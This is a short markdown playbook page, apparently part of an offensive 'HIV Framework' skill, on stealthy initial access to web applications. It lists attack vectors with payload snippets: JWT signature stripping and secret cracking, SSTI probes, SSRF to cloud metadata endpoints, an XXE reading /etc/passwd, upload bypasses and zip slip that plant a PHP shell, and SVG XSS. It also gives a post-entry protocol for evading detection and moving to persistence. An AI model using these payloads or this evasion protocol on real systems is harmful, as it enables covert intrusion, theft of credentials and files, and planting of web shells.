# Stage 2: gp41 — Initial Access

> gp41 fuses virus ke sel. Entry yang tenang — sel tidak langsung mati.
> Initial access harus QUIET. Noisy exploit = failed exploit.

## Entry Principle

Single valid request establishing foothold.
No excessive errors. Blend with normal traffic.
Immediately after access: move to Stage 4 (persistence).

## Access Vectors

### Auth Receptors
```
JWT alg:none signature strip
JWT weak secret (jwt-cracker / hashcat)
OAuth state CSRF → account takeover
SAML XML signature wrapping
Password reset token prediction
Account takeover via email normalization collision
```

### Injection Receptors
```
SQLi: boolean, time-based, OOB
SSTI: {{7*7}} Jinja2 | ${7*7} Freemarker | #{7*7} EL
SSRF: http://169.254.169.254/ | http://metadata.google.internal/
XXE: <!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]>
GraphQL: __schema dump → query sensitive resolvers
```

### Session Receptors
```
Session fixation: set ID before login
SameSite bypass: top-level navigation
JWT kid path traversal: "../../dev/null"
CSRF + JSON: text/plain content-type
```

### Upload Receptors
```
MIME bypass: Content-Type: image/jpeg but .php extension
Double ext: shell.php.jpg
SVG XSS: <svg><script>alert(1)</script></svg>
Zip slip: ../../../var/www/html/shell.php in archive
```

## Post-Entry Protocol (First 15 Minutes)

```
DO NOT: high-volume enumeration
DO NOT: multiple 500/403 errors
DO NOT: download large files
DO: blend with normal traffic
DO: immediately move to Stage 4 (persistence)
```

*Stage 2: gp41 Initial Access | HIV Framework | Security--Skill*
